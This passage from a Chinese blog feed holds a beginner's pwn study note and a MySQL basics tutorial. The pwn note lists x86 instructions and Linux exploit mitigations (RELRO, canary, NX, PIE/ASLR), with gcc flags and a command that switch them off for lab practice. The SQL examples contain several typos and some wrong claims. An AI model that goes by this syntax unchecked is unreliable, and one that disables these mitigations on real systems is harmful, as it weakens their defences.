CPU 指令可以有零个到多个运算子。</p><h4 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h4><table><thead><tr><th>汇编指令</th><th>实际作用</th><th>等价代码</th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>用于赋值</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>用于加&#x2F;减法</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>用于与&#x2F;异或&#x2F;或</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>压栈</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>出栈</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>调用函数</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>从函数返回</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>比较两个数。不保留结果,只修改flags寄存器</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><table><thead><tr><th>汇编指令示例</th><th>英文全称</th><th>实际作用</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>跳转</td></tr><tr><td>jz</td><td>jump if zero</td><td>为0时跳转</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>不为零时跳转</td></tr><tr><td>jg</td><td>jump if greater</td><td>有符号数大于跳转</td></tr><tr><td>jl</td><td>jump if lsee</td><td>有符号数小于跳转</td></tr></tbody></table><p>跳转指令不同于 mov 指令，他可以用于修改段寄存器 cs、ip 的值，从而修改 CPU 在内存中所读取的内容的地址。</p><p><del>表格是从小卓的博客copy来的</del></p><h1 id="Linux常用保护机制"><a href="#Linux常用保护机制" class="headerlink" title="Linux常用保护机制"></a>Linux常用保护机制</h1><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了 保护机制</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>这不是个保护机制是个脚本软件。</p><p>checksec用来检查可执行文件的属性，查看文件开启了哪些保护机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>以之前一道 Pwn 题题目为例：<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>RELRO即为read only relocation，可以理解为我们熟悉的windows系统里的只读。</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。</p><h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // 默认情况下，是Partial RELRO<br>gcc -z norelro -o hello test.c // 关闭，即No RELRO<br>gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO<br>gcc -z now -o hello test.c // 全部开启，即Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARY（栈保护）"><a href="#CANNARY（栈保护）" class="headerlink" title="CANNARY（栈保护）"></a>CANNARY（栈保护）</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。</p><p>在 Linux 中我们将 cookie 信息称为 canary。</p><h4 id="参数设置-1"><a href="#参数设置-1" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护<br>gcc -fstack-protector-all 启用保护，为所有函数插入保护<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit 只对有明确stack_protect attribute 的函数开启保护<br>gcc -fno-stack-protector 禁用保护<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>NX 即 No-eXecute（不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h4 id="参数设置-2"><a href="#参数设置-2" class="headerlink" title="参数设置"></a>参数设置</h4><p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 - z execstack 参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // 默认情况下，开启NX保护<br>gcc -z execstack -o test test.c        // 禁用NX保护<br>gcc -z noexecstack -o test test.c    // 开启NX保护<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>PIE即Position-Independent Executable（ 位置无关可执行文件），与ASLR 技术类似。</p><p>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关，即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。</p><p>这就意味着，在 PIE 和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，传统的改写GOT 表项的方法也难以进行，因为攻击者不能获得程序的.got 段的虚地址。</p><p>liunx 下关闭 PIE 的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="参数设置-3"><a href="#参数设置-3" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // 默认情况下，不开启PIE<br>gcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1<br>gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2<br>gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE<br>gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE<br></code></pre></td></tr></table></figure><hr><p>杂七杂八忙了一个周，抽时间学了这么点东西。我是菜鸡🥬</p><p>有看几道pwn题，发现大部分题目都是需要一些逆向技巧的，有些还会和web结合 <del>非常疯狂</del></p><p>如果有空web一些基础的东西我还是会继续学的，就熬夜吧熬夜吧🤪</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86汇编</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库基础</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>又名：学了就忘只能再看从头重学😣</p><span id="more"></span><h1 id="01-phpstudy中MySQL的简单使用"><a href="#01-phpstudy中MySQL的简单使用" class="headerlink" title="01 phpstudy中MySQL的简单使用"></a>01 phpstudy中MySQL的简单使用</h1><p>在学用MySQL的时候发现自己和学习资料用的不是同一个集成环境，所以打开方式不一样，这种小问题还是难不倒我哒😎</p><p>首先开启MySQL服务    <del>好了接下来就不会了</del></p><p>再去小皮官网看看</p><p>有一个模块是phpMyAdmin的使用。按照官方教程下载好打开我才发现这是在网页上操作，不是命令行。没关系，下载都下载了，学习一下。</p><h4 id="001-图形化界面操作"><a href="#001-图形化界面操作" class="headerlink" title="001 图形化界面操作"></a>001 图形化界面操作</h4><p>在软件管理找到<strong>phpMyAdmin</strong>，点击下载。下载完之后点管理就会自动在浏览器打开，输入用户名和密码就可以使用啦。</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong></p><p>在phpMyAdmin也可以用SQL查询语句嗷</p><blockquote><p>输入SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>使用其他界面操作内容时也可以预览SQL语句</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>总之就是很简单易上手辣😇</p><p><del>连我都可以无师自通</del></p><h4 id="002-cmd操作"><a href="#002-cmd操作" class="headerlink" title="002 cmd操作"></a>002 cmd操作</h4><blockquote><p>MySQL在phpstudy_pro文件下的Extensions文件夹里</p></blockquote><p>进入bin目录后在此处打开cmd</p><p>输入<code>mysql -u[用户名] -p[密码] -h [数据库服务器地址]</code>进入</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong>，打开本地数据库可以不加服务器地址</p><p>进入mysql之后就可以快乐使用了</p><h1 id="02-关于MySQL"><a href="#02-关于MySQL" class="headerlink" title="02 关于MySQL"></a>02 关于MySQL</h1><h4 id="001-MySQL常见符号"><a href="#001-MySQL常见符号" class="headerlink" title="001 MySQL常见符号"></a>001 MySQL常见符号</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>表示当前命令没有命令执行符或者等待命令执行符<code>;</code>或<code>\g</code>，也可以输入<code>\c</code>取消命令直接输入<code>;</code>回车即可执行命令。</p><h5 id="‘-gt-或”-gt"><a href="#‘-gt-或”-gt" class="headerlink" title="‘&gt;或”&gt;"></a>‘&gt;或”&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>表示当前命令缺少<code>&#39;</code>或<code>&quot;</code></p><h4 id="002-MySQL编码规范"><a href="#002-MySQL编码规范" class="headerlink" title="002 MySQL编码规范"></a>002 MySQL编码规范</h4><ul><li><p>关键字与函数名称全部大写；（不大写也可以执行命令）</p></li><li><p>数据库名称、表名、字段名称全部小写；</p></li><li><p>必须以分号结尾</p></li></ul><h4 id="003-结构化查询语言"><a href="#003-结构化查询语言" class="headerlink" title="003 结构化查询语言"></a>003 结构化查询语言</h4><p>主要分为四类</p><p>DDL-数据库定义语言（CREATE DROP ALTER)</p><p>DML-数据库操作语言（INSERT DELETE UPDATE)</p><p>DQL-数据库查询语言（SELECT WHERE)</p><p>DCL-数据库控制语言</p><p><del>说了这么多也没什么用</del>🤪</p><h1 id="03-SQL语法"><a href="#03-SQL语法" class="headerlink" title="03 SQL语法"></a>03 SQL语法</h1><h3 id="对库的操作"><a href="#对库的操作" class="headerlink" title="对库的操作"></a>对库的操作</h3><h5 id="查找库"><a href="#查找库" class="headerlink" title="查找库"></a>查找库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>不知道即将创建的库是否存在时，可使用以下命令：如果库不存在就创建，存在则退出命令</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>但不建议让MySQL来做判断</p></blockquote><h5 id="删除库"><a href="#删除库" class="headerlink" title="删除库"></a>删除库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>数据库不能修改名字</strong></p><h3 id="对表的操作"><a href="#对表的操作" class="headerlink" title="对表的操作"></a>对表的操作</h3><h5 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //查找当前库的所有表<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [数据类型] [列的完整性约束]，<br>    ······<br>);<br></code></pre></td></tr></table></figure><blockquote><p>name为创建的表格名，可自行更改</p><p>空格里填表格表头及数据信息</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>创建新表后，可以使用<code>desc table_name</code>查询表格信息</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>数据类型</p><table><thead><tr><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>Int</td><td>整数类型</td></tr><tr><td>char(n)</td><td>字符&#x2F;字符串，固定长度</td></tr><tr><td>varchar(n)</td><td>字符&#x2F;字符串，可变长度，最大长度为n</td></tr><tr><td>numeric(a,b)</td><td>精确数值，总位数为a，精确到小数点后第b位</td></tr><tr><td>date</td><td>时间，存储年月日的值</td></tr></tbody></table><p>字段约束</p><table><thead><tr><th>约束类型</th><th>说明</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>只能用于数值整型，设置无符号。最大值不能超过255</td></tr><tr><td>ZEROFILL</td><td>只能用于数值整形，自动用0补全不足位数。eg：001</td></tr><tr><td>AUTO_INCREMENT</td><td>设置字段的自动增量属性，只能用于设置数值类型。</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>默认为NULL，即没有在此字段插入值。如果设置NOT NULL，则必须在此字段插入相应的值。</td></tr><tr><td>DEFAULT</td><td>通过此属性设置默认值</td></tr><tr><td>PRIMARY KEY</td><td>主键约束，主键自动为NOT NULL。</td></tr></tbody></table><blockquote><p>AUTO_INCREMENT必须和PRIMARY KEY一起用。自动增量必须为主键，但主键不一定要自动增量。</p></blockquote><h5 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="对字段的操作"><a href="#对字段的操作" class="headerlink" title="对字段的操作"></a>对字段的操作</h3><h5 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [数据类型] [完整性约束] [位置参数];<br></code></pre></td></tr></table></figure><blockquote><p>位置参数可空默认加在表的最后，也可使用FIRST或AFTER[字段名]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [改后数据类型] [改后的完整性约束]；<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [改后数据类型] [改后的完整性约束]；<br></code></pre></td></tr></table></figure><blockquote><p>MODIFY关键字只能改数据类型和完整性约束</p></blockquote><h5 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]，DROP [column_name2]，······；<br></code></pre></td></tr></table></figure><h3 id="对内容的操作"><a href="#对内容的操作" class="headerlink" title="对内容的操作"></a>对内容的操作</h3><h5 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，(&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，······；<br>//一次插入多条数据<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br></code></pre></td></tr></table></figure><blockquote><p>第二种方法必须严格按照表中顺序一一填写，自增字段可用null占位但不能为空</p></blockquote><p>我的电脑输入字段名不能加引号不然会报错<del>就离谱</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h5><ul><li>选择某一行或某一列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>选择整个表格</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="删除字段-1"><a href="#删除字段-1" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [删除条件]; <br></code></pre></td></tr></table></figure><blockquote><p>删除可使用where条件。条件可空，为空时全部值被影响。</p></blockquote><h5 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [修改条件];<br></code></pre></td></tr></table></figure><blockquote><p>修改条件可空，全部值被影响。</p></blockquote><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>去除重复值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>where语句用于在表中选择指定符合条件的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE 条件（字段名+运算符+数值）;<br></code></pre></td></tr></table></figure><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>加</td></tr><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>&#x2F;或DIV</td><td>除</td></tr><tr><td>%或MOD</td><td>取余</td></tr></tbody></table><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;或！&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>between</td><td>在某个范围内</td></tr><tr><td>like</td><td>模糊匹配</td></tr></tbody></table><blockquote><p>可以使用and或or连接多个条件</p></blockquote><p> <strong>like符号举例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[查询内容]%&#x27;      //表示以[查询内容]开头的数据<br>like &#x27;%[查询内容]&#x27;      //表示以[查询内容]结尾的数据<br>like &#x27;%[查询内容]%&#x27;      //表示只要查询内容出现即可<br>like &#x27;_[查询内容]%&#x27;      //表示查询内容前有一位字符，后有任意字符<br>like &#x27;%[查询内容]_&#x27;      //表示查询内容前有任意字符，后有一位字符<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>between用法</strong></p><p> between运算符包括起始值和结束值</p><p> 用于选取两个数值范围之内的值，可以是字符串，数字或者日期</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>NOT或！</td><td>逻辑非</td></tr><tr><td>AND</td><td>逻辑与</td></tr><tr><td>OR</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td></tr><tr><td>|</td><td>按位或</td></tr><tr><td>^</td><td>按位异或</td></tr><tr><td>!</td><td>取反</td></tr><tr><td>&lt;&lt;</td><td>左移</td></tr><tr><td>&gt;&gt;</td><td>右移</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>in实际上是多个or的合并</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subquery为子查询，用于嵌套在where子句中的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],···FROM [table_name] WHERE条件 (子查询)<br></code></pre></td></tr></table></figure><blockquote><p>子查询为一个完整的select语句</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>用as为查找对象起别名，但我没尝试成功🥲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [字段名] FROM [table_name] [条件语句] as [别名]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h5 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h5><p>count函数统计符合条件的记录数</p><p>统计表中的记录<strong>总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>不为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="max函数"><a href="#max函数" class="headerlink" title="max函数"></a>max函数</h5><p>max函数返回所选字段最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="min函数"><a href="#min函数" class="headerlink" title="min函数"></a>min函数</h5><p>min函数返回所选字段最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avg函数"><a href="#avg函数" class="headerlink" title="avg函数"></a>avg函数</h5><p>avg函数返回所选字段的平均值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sum函数"><a href="#sum函数" class="headerlink" 